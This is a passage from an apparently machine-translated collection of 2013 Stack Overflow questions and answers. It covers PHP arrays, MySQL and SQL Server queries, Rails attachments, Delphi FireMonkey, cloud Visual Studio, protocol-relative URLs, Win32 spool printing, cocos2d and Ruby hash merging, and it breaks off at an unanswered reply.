    [0] => Array
        (
            [id] => 1
            [parent_id] => 0
        )

    [1] => Array
        (
            [id] => 2
            [parent_id] => 1
        )

    [2] => Array
        (
            [id] => 3
            [parent_id] => 1
        )

    [3] => Array
        (
            [id] => 4
            [parent_id] => 3
        )

) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T13:21:17.020

使用此代码

```
$result =   array();
function generateArray($array,$parent=0){
    foreach ($array as $key=>$val){
        $tmp = array();
        if(!empty($val['id'])){
            $tmp['id'] = $val['id'];
            $tmp['parent_id'] = $parent;
            $result[] = $tmp;
        }
        if(!empty($val['positions'])){
            $result=array_merge($result,generateArray($val['positions'],$val['id']));
        }
    }
    return $result;
} 
```

你的数组必须是这个结构

```
$data   =   array(0=>array("id"=>1,"positions"=>array(0=>array("id"=>2),1=>array("id"=>3,"positions"=>array(0=>array("id"=>4)))))); 
```

然后调用函数`generateArray()`，

```
var_dump(generateArray($data)); 
```

# aem - 如何在 CQ5 的页面中添加 CSS、图像？

> ID：14832683
> 
> 赞同：2
> 
> 时间：2013-02-12T12:34:17.860
> 
> 标签：aem, crx

我正在创建一个新模板，然后在 CQ5 中从 SCRATCH 创建一个页面。但我找不到将我自己的 CSS/图像/JS 添加到页面的选项。

我的意思是添加/上传实际文件的地方。

我见过的所有教程都只讨论基于现有模板创建模板。有没有关于如何从头开始创建页面的教程？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-12T17:09:50.877

您的 CSS 和 JavaScript 进入`/etc/designs/[your project's name]/clientlibs`. （通常，您可以将`cq:designPath`内容主页的 page 属性设置`/etc/designs/[your project's name]`为指向它。）通常的做法是设置一个名为 的 clientlibs 子文件夹`default`，您的通用样式表和 JavaScript 都存放在该文件夹中；您可以为特殊情况的脚本和样式表设置其他客户端库。将脚本和样式表合并到页面模板中的最简单方法是`<cq:includeClientLib>`JSP 标记。

[clientlibs](http://dev.day.com/docs/en/cq/current/developing/components/clientlibs.html)上的 Adob​​e 文档对您也很有用，并解释了如何使用该标签。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-18T07:20:06.337

@David，感谢您的回答，但现在，我有一个更好的方法来添加然后使用带有 CQ5 的 WebDAV 的外部文件。

[本页](http://dev.day.com/docs/en/crx/current/how_to/webdav_access.html)提到了 WebDAV 与 CQ5 应用程序的基本集成

# mysql - MySQL - 将定时事件行转换为状态范围

> ID：14832689
> 
> 赞同：1
> 
> 时间：2013-02-12T12:34:36.843
> 
> 标签：mysql, datetime, select

假设房子经常被粉刷，我在一个简单的表中跟踪变化（“油漆”事件）：

```
 _______________________
/ PaintDate | NewColor  \
|-----------|-----------|
| 1/2/2012  |  Red      |
| 3/5/2013  |  Blue     |
| 9/9/2013  |  Green    |
\___________|___________/ 
```

是否有一个 SELECT 语句可以给我一张**房子在特定颜色的日期范围的**表格？

期望的输出：

```
 _______________________________
/  From    |   To     |  Color  \
|----------|----------|---------|
| 1/2/2012 | 3/5/2013 |   Red   |
| 3/5/2013 | 9/9/2013 |   Blue  |
| 9/9/2013 | NULL     |   Green | -- Not repainted yet, the date in the 'To' column should be NULL
\__________|__________|_________/ 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:42:13.233

那么你可以使用这个查询

```
SELECT 
  p.PaintDate AS `From`,
  l.PaintDate AS `TO`,
  p.NewColor AS `Color` 
FROM
  paint AS p 
  LEFT JOIN 
    (SELECT * FROM paint LIMIT 1, 18446744073709551615) AS l   
    ON l.PaintDate = (SELECT PaintDate FROM paint WHERE PaintDate > p.PaintDate ORDER BY PaintDate ASC LIMIT 1) 
```

输出

```
From       |    TO          | Color
-------------------------------
2012-02-01 |    2012-05-03  | Red
2012-05-03 |    2013-09-09  | Blue
2013-09-09 |    (NULL)      | Green 
```

## [演示](http://www.sqlfiddle.com/#!2/24a5f/1)

上面的查询可以这样改进

```
SELECT 
  p.PaintDate AS `From`,
  l.PaintDate AS `TO`,
  p.NewColor AS `Color` 
FROM
  paint AS p 
  LEFT JOIN paint AS l ON l.PaintDate = (SELECT PaintDate FROM paint WHERE PaintDate > p.PaintDate ORDER BY PaintDate ASC  LIMIT 1) 
```

## [演示](http://www.sqlfiddle.com/#!2/24a5f/2)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:43:41.570

```
SELECT  aa.PaintDate `FROM`, bb.PaintDate `TO`,
        aa.NewColor
FROM    
        (
            SELECT  @row:=@row+1 as RankNo,
                    a.PaintDate,
                    a.NewColor
            FROM    tableName a, (SELECT @row:=0) b
            ORDER   BY a.PaintDate
        ) aa
        LEFT JOIN
        (
            SELECT  @row2:=@row2+1 as RankNo,
                    a.PaintDate
            FROM    tableName a, (SELECT @row2:=0) b
            ORDER   BY a.PaintDate
        ) bb ON aa.RankNo+1 = bb.RankNo 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!2/97e8f/3)

# ruby-on-rails-3 - 使用 Attachment_fu 更新文件附件（图像）的问题

> ID：14832696
> 
> 赞同：0
> 
> 时间：2013-02-12T12:34:46.147
> 
> 标签：ruby-on-rails-3, attachment-fu

我可以使用 Attachment_fu 将图像文件作为附件上传，但是当我尝试编辑/修改已上传的图像时，它不起作用。在我的控制器中，我有这个：

```
 def update
          @sponsor_account = SponsorAccount.find( params[:id] )
          if params[:showcase_category_image_file] &&         
           !params[:showcase_category_image_file].blank?
            @sponsor_account.showcase_category_image = 
            ShowcaseCategoryImage.new(:uploaded_data =>
            params[:showcase_category_image_file])
       ***This logs - Now the file name is: *** 
            Rails.logger.info("Now the file name is: #
            {@sponsor_account.showcase_category_image.filename}") 
          end
      @sponsor_account.update_attributes( params[:sponsor_account] )
    if @sponsor_account.save
         flash[:notice] = "Showcase category #{@sponsor_account.name} was updated!"
    else
         flash[:errors] = @sponsor_account.errors
    end
         redirect_to sponsor_accounts_path
    end 
```

ShowcaseCategoryImage 定义如下：

```
 has_attachment :content_type => :image,
             :storage => :file_system,
             :max_size => 5.megabytes,
             :thumbnails => { :large => [350, 100], :medium => [200, 90], :thumb => 
              [35,35], :preview => [60,60] }

    validates_as_attachment 
```

该视图有一个 file_field_tag 如下：

```
 <%= file_field_tag :showcase_category_image_file%> 
```

我的 SponsorAccount 模型说：

```
 has_one  :showcase_category_image, :as => :owner, :dependent => :destroy
         validates_presence_of :showcase_category_image, :on => :create 
```

几乎相似的代码在“创建”中工作得很好，但在“更新”操作中已经有一个值，这个代码不起作用。

我收到以下错误消息： Completed 500 Internal Server Error in 1089ms ActionView::Template::Error (undefined method `public_filename' for nil:NilClass): 显然这个错误出现在索引操作中，它试图列出所有记录和他们的附件。由于更新后这个附件是空的，所以在redirect_to部分会抛出这个错误。

我正在使用 REE1.8.7 和 rails 3.2.9

请帮忙！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-14T05:08:10.003

当我在“视图”中添加 :multipart => true 时，这个问题得到了解决。我正在使用 rails 3.2.9，rails api 对“file_field_tag”有这样的说法：

file_field_tag(name, options = {}) Link 创建文件上传字段。**如果您正在使用文件上传，那么您还需要为表单标签设置 multipart 选项：**

# delphi - 向 firemonkey Treeviewitem 复选框添加功能 // 限制 Firemonkey 样式事件？

> ID：14832699
> 
> 赞同：1
> 
> 时间：2013-02-12T12:34:53.210
> 
> 标签：delphi, firemonkey, delphi-xe3

我使用以下方法将功能添加到我的 Treeviewitem 的复选框。

```
function TForm.CreateTVObj:TTreeviewItem;
var
  MyCheckbox:TCheckbox;
begin
  try
    result:=TTreeviewItem.create(nil);
    result.Parent:=Treeview;

    result.StyleLookup:='treeviewitemstyle';

    MyCheckbox:= result.FindStyleResource('check') as TCheckbox;
    //the functionality:
    MyCheckbox.OnChange:= CheckBoxChange;

  except
    on e:exception do begin
      ShowMessage('Error'+chr(13)+chr(13)+e.Message);
    end;
  end;
end; 
```

## 现在我有以下问题：

它适用于有限数量的项目。如果我添加了很多项目，**则 checkboxchange 仅针对前 9-12 个项目触发**。

有限制吗？如果我从顶部开始检查它们，则只有前 12 个工作。如果我先单击最后一项，则前 3 项也不起作用...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T16:02:50.850

您可能会发现复选框的 OnChange 事件在内部被树视图挂钩。

您需要改为挂接到树视图的 OnCheckChange 中。如果您使用的是 XE2，则 Sender 将是已更改的 ListBoxItem。

在 XE3 的早期版本中，它将是 TreeView 本身，您需要找到其他方法来查找更改的项目（即递归树元素并将它们的状态与原始数据进行比较）。

QC 显示这已在最近的更新中得到修复，但我没有机会对其进行测试[http://qc.embarcadero.com/wc/qcmain.aspx?d=109138](http://qc.embarcadero.com/wc/qcmain.aspx?d=109138)

# visual-studio - 云中的 Visual Studio？

> ID：14832703
> 
> 赞同：5
> 
> 时间：2013-02-12T12:35:09.020
> 
> 标签：visual-studio, cloud, vpn

是否有云解决方案

*   Visual Studio 在 PUBLIC 云中托管的虚拟桌面上运行（而不是在我机房的私人物理服务器上）
*   可以从世界任何地方访问虚拟桌面
*   *虚拟桌面可以通过 VPN*与另一个域上的实际远程 SQL Server 实例通信
**   VPN 不需要在远程域的防火墙上安装特殊软件*   虚拟桌面将能够作为域用户加入其他 Windows 域（世界其他地方），以便 Visual Studio 可以将应用程序发布到这些域内的 LAN 服务器？*

 ** * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-12T12:46:03.610

这里想到了 Windows Azure 虚拟机。现在，当然，您必须安装并拥有您希望使用的所有软件的许可证（尽管我认为 MSDN 许可证会涵盖您）。但是，您可以轻松部署 VM，使用所有开发工具进行配置，然后将其保存为模板。然后可以在几分钟内将模板重新部署到任意数量的 VM。

Azure 虚拟机可以做 VPN 和加入域。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-01-25T19:18:47.727

基于 Paul 上面给出的答案，Windows Azure 中有一个虚拟机映像（适用于 MSDN 订阅者）。IT 对我们来说是一种全新的方法，但我相信可以满足您的要求，包括 WW 公共访问和 VPN 解决方案。

您可以在此处阅读详细信息：http: [//visualstudio2013galleryimage.azurewebsites.net/](http://visualstudio2013galleryimage.azurewebsites.net/)

您可以在此处查看该功能的简短视频：http: [//channel9.msdn.com/Events/Visual-Studio/Launch-2013/WC120](http://channel9.msdn.com/Events/Visual-Studio/Launch-2013/WC120)

如果您对此方法有任何疑问或反馈，请告诉我。

谢谢，

Paul Yuknewicz，Visual Studio 首席 PM

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-09-08T12:44:25.753

看看[CloudShare](http://www.cloudshare.com/)，它可能满足您的需求。这两篇文章来自他们的知识库[请求和设置 CloudShare VPN 网关](https://support.cloudshare.com/entries/22931113-Requesting-and-setting-up-a-CloudShare-VPN-Gateway)和博客[网络编排：VPN、联合、集成，](http://blog.cloudshare.com/2011/10/09/network-orchestration-vpn-federation-integration/)解释了如何根据需要将 CloudShare VM 链接到公司网络。

更一般地说，最佳解决方案取决于您是否需要预安装所有软件的交钥匙解决方案（因此您需要支付更多费用，因为云提供商处理软件许可）还是您自己构建的“裸机”虚拟机安装所有内容（因此您向他们支付的费用较少，并且必须自己购买软件许可证），或者介于两者之间。从你的问题中不清楚，你能澄清一下吗？

换句话说，大大简化了：

*   软件即服务 (SaaS)，包括预安装的 VM、Windows Server 和 Visual Studio
*   平台即服务 (PaaS) 具有虚拟机、操作系统和其他解决方案基础架构，例如数据库、Web 服务器等，但不是您的主要应用程序
*   基础设施即服务 (IaaS) 的虚拟机没有安装任何东西，甚至没有安装操作系统

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-11-29T12:40:12.807

**2019 更新**

微软现在提供[Visual Studio Online](https://visualstudio.microsoft.com/services/visual-studio-online/)。

以下是所有内容的列表：[什么是 Visual Studio Online？](https://docs.microsoft.com/en-us/visualstudio/online/overview/what-is-vsonline)

> Visual Studio Online 提供公共预览版。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-08-08T20:07:28.150

**2020 更新**

请查看[yaoe.io](https://yaoe.io) - 您在浏览器中的开发人员工作区

Visual Studio Code 已移植到浏览器。通过实时协作获得相同的原生体验！

[![在此处输入图像描述](../Images/0de6b557d4902e9b35a272622ab0a671.png)](https://i.stack.imgur.com/80qx1.png)

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2013-11-14T06:04:02.167

微软昨天刚刚与 Visual Studio 2013 一起推出了 Visual Studio Online。它可以在大多数现代浏览器上运行。谷歌了解更多详情。*

# javascript - 为什么没有为此脚本标签指定协议

> ID：14832705
> 
> 赞同：5
> 
> 时间：2013-02-12T12:35:14.157
> 
> 标签：javascript, facebook

有了这个我可以生成一个喜欢的按钮：D

```
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script> 
```

但为什么不是

js.src = "**一些协议：** //connect.facebook.net/en_US/all.js#xfbml=1";

为什么没有具体的协议？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-12T12:46:01.900

这是一个有用的技巧，它允许您使用适用于 HTTP 和 HTTPS 页面的单个引用。当省略 URL 的协议时，浏览器将使用底层文档的协议。

在通过常规、未加密的 HTTP 加载的页面上，使用该 URL 的脚本引用将通过 HTTP 加载并正常缓存。同样，在通过 HTTPS 加载的安全页面上。

因此，使用无协议 URL 允许单个脚本引用自行适应最优化的内容：HTTP 及其对 HTTP 页面的完全缓存支持，以及安全页面上的 HTTPS，这样您的用户就不会遇到混合内容警告。

资料来源：[http ://encosia.com/cripple-the-google-cdns-caching-with-a-single-character/](http://encosia.com/cripple-the-google-cdns-caching-with-a-single-character/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:41:49.760

[这是一个名为“协议相对 URL](http://paulirish.com/2010/the-protocol-relative-url/) ”的小技巧，可以“为您省去一些麻烦”。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:37:10.277

不指定协议可确保在发起请求中使用的相同协议也被假定为脚本文件的请求。

如果您通过 http 请求，脚本将通过 https 等加载。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-12T12:37:21.317

当协议被省略时，浏览器采用`http`或`https`遵循当前页面的协议。这允许包含外部资源而无需担心安全警告。

当然，要使其正常工作，外部资源的路径必须在当前页面的协议中可用。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-12T12:39:04.070

> 为什么没有具体的协议？

因为省略 URL 的方案部分会告诉客户端使用他已经在使用该资源嵌入文档的请求的协议。

在这种情况下，它允许浏览器选择 http:// 或 https://，这取决于文档本身是通过“正常”HTTP 还是 HTTPS 加载的。

# c# - 如何使用 XPS 打印机重新打印假脱机文件？

> ID：14832708
> 
> 赞同：1
> 
> 时间：2013-02-12T12:35:16.883
> 
> 标签：c#, printing, print-spooler-api

我正在构建一个程序来捕获打印文档，然后将这些文档转换为 xps\image。

目前我正在使用[FileSystemWatcher](http://msdn.microsoft.com/en-us/library/system.io.filesystemwatcher.aspx)监视目录“C:\Windows\System32\spool\PRINTERS\”并复制 spl 文件，确保其不重复然后**尝试通过使用**[Win32 Spooler API](http://support.microsoft.com/kb/322091)打印 spl 文件将其转换为 xps 文件和*Microsoft XPS Document Writer*预定义的打印机，但是当我指定如下所示的输出文件时，返回错误代码 1804，如果我将其留空，则成功但我没有得到输出文件。

```
 public static bool SendBytesToPrinter(string szPrinterName, IntPtr pBytes, Int32 dwCount, string outputFile, string dataType, out int errorCode)
    {
        IntPtr hPrinter;
        var di = new DOCINFOA();
        var bSuccess = false; // Assume failure unless you specifically succeed.

        di.pDocName = "Spool Doc";
        di.pDataType = dataType;
        di.pOutputFile = outputFile;

        // Open the printer.
        if (OpenPrinter(szPrinterName.Normalize(), out hPrinter, IntPtr.Zero))
        {
            // Start a document.
            if (StartDocPrinter(hPrinter, 1, di))
            {
                // Start a page.
                if (StartPagePrinter(hPrinter))
                {
                    // Write your bytes.
                    var dwWritten = 0;
                    bSuccess = WritePrinter(hPrinter, pBytes, dwCount, out dwWritten);
                    EndPagePrinter(hPrinter);
                }
                EndDocPrinter(hPrinter);
            }
            ClosePrinter(hPrinter);
        }
        // If you did not succeed, GetLastError may give more information
        // about why not.
        errorCode = bSuccess == false ? Marshal.GetLastWin32Error() : 0;
        return bSuccess;
    } 
```

所以，我做错了什么，以及如何将假脱机文件打印\转换为 XPS 文档，如果可能的话，转换为图像文件和文本文件。

**编辑：添加附加信息**

这是 DOCINFOA 的实现

```
 [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    public class DOCINFOA
    {
        [MarshalAs(UnmanagedType.LPStr)]
        public string pDataType;
        [MarshalAs(UnmanagedType.LPStr)]
        public string pDocName;
        [MarshalAs(UnmanagedType.LPStr)]
        public string pOutputFile;
    } 
```

这是完整的调用链：

该应用程序运行以下代码

```
 var dataTypes = new[] { null, "RAW", "RAW [FF appended]", "RAW [FF auto]", "NT EMF 1.003", "NT EMF 1.006", "NT EMF 1.007", "NT EMF 1.008", "TEXT", "XPS_PASS", "XPS2GDI" };
    foreach (var dataType in dataTypes)
    {
        int errorCode;
        RawPrinterHelper.SendFileToPrinter(@"Microsoft XPS Document Writer", sourceFile, outputFile, dataType, out errorCode);
        //print errorCode
    } 
```

在*RawPrinterHelper中*

```
 public static bool SendFileToPrinter(string szPrinterName, string szFileName, string outputPath, string dataType, out int errorCode)
    {
        // Open the file.
        var fs = new FileStream(szFileName, FileMode.Open);
        // Create a BinaryReader on the file.
        var br = new BinaryReader(fs);
        // Dim an array of bytes big enough to hold the file's contents.
        // Your unmanaged pointer.
        var documentPath = Path.GetFileName(szFileName);
        var nLength = Convert.ToInt32(fs.Length);
        // Read the contents of the file into the array.
        var bytes = br.ReadBytes(nLength);
        // Allocate some unmanaged memory for those bytes.
        var pUnmanagedBytes = Marshal.AllocCoTaskMem(nLength);
        // Copy the managed byte array into the unmanaged array.
        Marshal.Copy(bytes, 0, pUnmanagedBytes, nLength);
        // Send the unmanaged bytes to the printer.
        var bSuccess = SendBytesToPrinter(szPrinterName, pUnmanagedBytes, nLength, outputPath, dataType, out errorCode);
        // Free the unmanaged memory that you allocated earlier.
        Marshal.FreeCoTaskMem(pUnmanagedBytes);
        fs.Close();
        return bSuccess;
    } 
```

以及API函数

```
 [DllImport("winspool.Drv", EntryPoint = "OpenPrinterA", SetLastError = true, CharSet = CharSet.Ansi,
    ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
    public static extern bool OpenPrinter([MarshalAs(UnmanagedType.LPStr)] string szPrinter, out IntPtr hPrinter, IntPtr pd);

    [DllImport("winspool.Drv", EntryPoint = "ClosePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
    public static extern bool ClosePrinter(IntPtr hPrinter);

    [DllImport("winspool.Drv", EntryPoint = "StartDocPrinterA", SetLastError = true, CharSet = CharSet.Ansi,
    ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
    public static extern bool StartDocPrinter(IntPtr hPrinter, Int32 level, [In, MarshalAs(UnmanagedType.LPStruct)] DOCINFOA di);

    [DllImport("winspool.Drv", EntryPoint = "EndDocPrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
    public static extern bool EndDocPrinter(IntPtr hPrinter);

    [DllImport("winspool.Drv", EntryPoint = "StartPagePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
    public static extern bool StartPagePrinter(IntPtr hPrinter);

    [DllImport("winspool.Drv", EntryPoint = "EndPagePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
    public static extern bool EndPagePrinter(IntPtr hPrinter);

    [DllImport("winspool.Drv", EntryPoint = "WritePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
    public static extern bool WritePrinter(IntPtr hPrinter, IntPtr pBytes, Int32 dwCount, out Int32 dwWritten); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-14T15:08:35.047

问题是您对 DOC_INFO_1 结构的声明。[它与Windows 期望的布局](http://msdn.microsoft.com/en-us/library/windows/desktop/dd162471%28v=vs.85%29.aspx)不匹配。Windows 声明如下所示：

```
typedef struct _DOC_INFO_1 {
  LPTSTR pDocName;
  LPTSTR pOutputFile;
  LPTSTR pDatatype;
} DOC_INFO_1; 
```

但是你的声明是这样的：

```
public class DOCINFOA
{
    public string pDataType;
    public string pDocName;
    public string pOutputFile;
} 
```

重新排序声明中的元素以匹配 Windows 结构，它应该可以解决您的问题。

编辑：坏消息。你的方法行不通。查看[WritePrinter](http://msdn.microsoft.com/en-us/library/windows/desktop/dd145226%28v=vs.85%29.aspx)的文档：

> WritePrinter 仅支持 GDI 打印，不得用于 XPS 打印。如果您的打印作业使用 XPS 或 OpenXPS 打印路径， [则使用 XPS Print API](http://msdn.microsoft.com/en-us/library/windows/desktop/ff686814%28v=vs.85%29.aspx)。不支持使用 WritePrinter 将 XPS 或 OpenXPS 打印作业发送到后台处理程序，这可能会导致不确定的结果。

# sql - SQL delete in EXCEL VBA

> ID：14832712
> 
> 赞同：1
> 
> 时间：2013-02-12T12:35:39.793
> 
> 标签：sql, excel, vba

I manage an Excel 2007 sheet using SQL, using the following connection string:

> Provider=Microsoft.ACE.OLEDB.12.0;Data Source='Invoice.xlsm';Extended Properties='Excel 12.0;IMEX=1;HDR=Yes'

Everything works just as it should apart from the Delete statement. When I try to perform `Delete From [tablename$] where code like '1')`, I get an error `-2147467259 (80004005)`.

I can't explain it, since all the other select and insert statements work just fine.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T15:43:02.053

在 Microsoft 支持中搜索了几个小时后，我发现了以下内容：

`The Catalog object has a Create method but does not have a Delete method.`

我想没有办法在 excel 表中执行 SQL Delete 语句。

# mysql - 带有空格的用户电子邮件，用 MySQL 修复？

> ID：14832720
> 
> 赞同：1
> 
> 时间：2013-02-12T12:36:08.233
> 
> 标签：mysql, sql

我发现在我的 65.000 名用户中，有很多人的电子邮件中有这样的空格：

```
"firstname@email.com "
" firstname@email.com"
" firstname@email.com " 
```

这可以通过 php trim() 函数轻松解决，并且我会收到干净的电子邮件。

不可能再像这样在输入中输入电子邮件，但它是这样的，因此我在前 20k 用户中有这样的电子邮件。

我想知道我是否可以做一个智能的 UPDATE MySQL 查询，在一次运行中清理（修剪电子邮件），或者我是否必须使用一些 php，在那里我抓取所有用户并通过它们，修剪（）并更新行每 65k 用户？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-12T12:39:03.783

您也可以[`TRIM`](http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_trim)在 MySql 中使用：

```
update users set email = TRIM(email); 
```

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2013-02-12T12:39:35.110

使用`trim()`PHP 中的函数并更新数据库中的所有条目。请注意 PHP 执行时间，您可能必须在不同的执行中拆分更新。

# cocos2d-iphone - 游戏结束和重启按钮 Cocos2d

> ID：14832721
> 
> 赞同：0
> 
> 时间：2013-02-12T12:36:08.927
> 
> 标签：cocos2d-iphone

我已经实现了一个游戏，在所有生命的尽头，游戏都结束了。所以我必须在这一点暂停场景，然后我必须实现标签 Game Over (Done)、点和允许重新开始游戏的按钮。现在，当游戏结束时，我得到了游戏结束标签和新开始游戏的叠加！我想在比赛结束和得分的情况下暂停比赛。

这是我的代码：

```
-(void)gameOver:(int)value punteggio:(id)punti{
    if (value == 1) {
        // partita vinta
    } else if (value == 2) {
        if (life > 1) { // 1
            life = life - 1;
            for (CCSprite *spr in spriteLifeArray) {
                if (life == spr.tag) {
                    [self removeChild:spr cleanup:YES];
                }
            }
        } else { 
            //  partita persa
            Gameover = [CCLabelTTF labelWithString:@"Game Over!" fontName:@"Marker Felt" fontSize:34];
            [Gameover setColor:ccc3(255, 1, 1)];
            Gameover.position = ccp(size.width / 2, size.height / 2);
            [self addChild:Gameover];
            //blinking
            id action1 = [CCBlink actionWithDuration:0.3 blinks:5];
            [Gameover runAction: action1];
            [[CCDirector sharedDirector] pause];
        }
    }
} 
```

我该如何解决？我怎样才能让这个按钮在暂停的场景中重新开始游戏？谢谢你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T05:24:45.360

你可以这样做：

使用 CCMenuItemLabel 创建一个简单的 CCMenu。

```
 CCMenuItemLabel *gameOver = [CCMenuItemLabel itemWithLabel:@"Game Over!" target:self selector:@selector(restart:)];
      CCMenu *menu = [CCMenu menuWithItems:gameOver, nil];
      [self addChild:menu z:(Something bigger than all others so that it shows up on top)]; 
```

然后在你的重启方法中：

```
 -(void) restart:(id)sender{
          menu.visible = NO;
          //code to restart your game;
    } 
```

希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-14T12:05:11.363

我已经解决了创建一个名为 GameOVer 并重新启动函数的节点。在 GameOver 实现中，我编写了一个重新启动的函数

```
-(void) restart {    
    [[CCDirector sharedDirector] replaceScene:[HelloWorldLayer node]];
} 
```

我已将此函数链接到 GameOver 层中的标签：

```
CCMenuItemLabel *back = [CCMenuItemLabel itemWithLabel:label2  target:self selector:@selector(restart)]; 
```

最后我在主层连接，如果`lives==0`这段代码

```
[[CCDirector sharedDirector] replaceScene:[GameOver node]]; 
```

并且一切正常！:)

# ruby - Ruby：哈希数组*带有重复键*到哈希（递归或深度减少？）

> ID：14832726
> 
> 赞同：1
> 
> 时间：2013-02-12T12:36:18.377
> 
> 标签：ruby, arrays, ruby-on-rails-3, hash

我有一个哈希数组

```
var = 
[
{#<InstanceFoo>=>{Date1=>Value1}}, 
{#<InstanceBar>=>{Date2=>Value2}},
{#<InstanceBaz>=>{Date3=>Value3}}
] 
```

我想将其简化为哈希：

```
{
#<InstanceFoo>=>{Date1=>Value1}, 
#<InstanceBar>=>{Date2=>Value2},
#<InstanceBaz>=>{Date3=>Value3}
} 
```

我过去通过以下方式实现了这一目标：

```
var.reduce({}, :merge) 
```

我刚刚注意到一个问题，但是，`var`实际上看起来像这样：

```
var = 
[
{#<InstanceFoo>=>{Date1=>nil}}, 
{#<InstanceFoo>=>{Date2=>Value2}},
{#<InstanceFoo>=>{Date3=>Value3}}
] 
```

结果`reduce`如下：

```
var = 
{
  #<InstanceFoo>=>{Date1=>nil}
} 
```

我想返回：

```
var = 
{
  #<InstanceFoo>=>{Date1=>nil, Date2=>Value2, Date3=>Value3}
} 
```

我想这是递归（或深度）合并？有任何想法吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:43:09.783

尝试：

```
var.reduce({}, :deep_merge) 
```

# sql - 用字符串替换左外连接空值

> ID：14832727
> 
> 赞同：1
> 
> 时间：2013-02-12T12:36:20.350
> 
> 标签：sql, sql-server, left-join, isnull

我想用字符串“UnRegistered”显示从左外连接返回的空值。

当值是整数或布尔值时，我只写：

```
 ISNULL(ReturnedValue, 0) AS ReturnedValue 
```

但我怎样才能做到：

```
 ISNULL(ReturnedValue, 'UnRegistered') AS ReturnedValue 
```

我使用 MS SQL 服务器。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-12T12:42:25.937

由于您需要`varchar`同一字段中的值以及 int/bool，因此您需要确保该字段的每一行都具有相同的数据类型。

```
Isnull(Convert(varchar(50), ReturnedValue), 'UnRegistered') AS ReturnedValue 
```

***或者***你可以使用`CASE`as

```
Case when ReturnedValue is null then 'UnRegistered'
     else convert(varchar(50), ReturnedValue) end as ReturnedValue 
```

# ruby-on-rails - Error while trying to install ruby for rail

> ID：14832730
> 
> 赞同：1
> 
> 时间：2013-02-12T12:36:27.467
> 
> 标签：ruby-on-rails, ruby, ubuntu

I am trying to install Ruby on Rails using [https://www.digitalocean.com/community/articles/how-to-install-ruby-on-rails-on-ubuntu-12-04-lts-precise-pangolin-with-rvm](https://www.digitalocean.com/community/articles/how-to-install-ruby-on-rails-on-ubuntu-12-04-lts-precise-pangolin-with-rvm) tutorial, but when I get to the part where I need to install Ruby 1.9.3 it always display this error message.

```
Searching for binary rubies, this might take some time.
No binary rubies available for: ubuntu/12.04/i386/ruby-1.9.3-p385.
Continuing with compilation. Please read 'rvm mount' to get more information on binary     rubies.
Installing Ruby from source to: /home/eldin/.rvm/rubies/ruby-1.9.3-p385, this may take a   while depending on your cpu(s)...
ruby-1.9.3-p385 - #downloading ruby-1.9.3-p385, this may take a while depending on your     connection...
ruby-1.9.3-p385 - #extracted to /home/eldin/.rvm/src/ruby-1.9.3-p385 (already extracted)
ruby-1.9.3-p385 - #configuring
ruby-1.9.3-p385 - #compiling
Error running 'make', please read /home/eldin/.rvm/log/ruby-1.9.3-p385/make.log
There has been an error while running make. Halting the installation. 
```

I can not use Ruby interpretor, so Ruby is not installed.

I am using Ubuntu OS.

EDIT:

```
/home/eldin/.rvm/log/ruby-1.9.3-p385/make.log 
```

Content of make.log

```
CC = gcc
LD = ld
LDSHARED = gcc -shared
CFLAGS = -O3 -ggdb -Wall -Wextra -Wno-unused-parameter -Wno-parentheses -Wno-long-long -Wno-missing-field-initializers -Werror=pointer-arith -Werror=write-strings -Werror=declaration-after-statement -Werror=implicit-function-declaration  -fPIC 
XCFLAGS = -include ruby/config.h -include ruby/missing.h -fvisibility=hidden -DRUBY_EXPORT
CPPFLAGS =   -I/home/eldin/.rvm/usr/include -I. -I.ext/include/i686-linux -I./include -I.
DLDFLAGS = -Wl,-soname,libruby.so.1.9  
SOLIBS = -lpthread -lrt -ldl -lcrypt -lm  
linking miniruby
vm.o: file not recognized: File truncated
collect2: ld returned 1 exit status
make: *** [miniruby] Error 1 
```

* * *

## 回答 #1

> 赞同：1
> 
